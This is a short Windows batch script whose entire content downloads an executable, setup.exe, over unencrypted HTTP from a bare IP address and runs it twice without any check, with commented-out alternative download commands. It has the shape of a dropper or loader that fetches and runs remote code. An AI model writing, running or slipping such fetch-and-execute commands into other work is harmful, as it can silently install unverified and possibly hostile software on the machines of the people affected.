ECHO OFF
rem bitsadmin /transfer mydownloadjob http://195.15.228.159/public/setup.exe %cd%\setup.exe
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://195.15.228.159/public/setup.exe', 'setup.exe')"
rem powershell -Command "Invoke-WebRequest http://www.example.com/package.zip -OutFile package.zip"
%cd%\setup.exe
%cd%\setup.exe RUN
exit
//Pause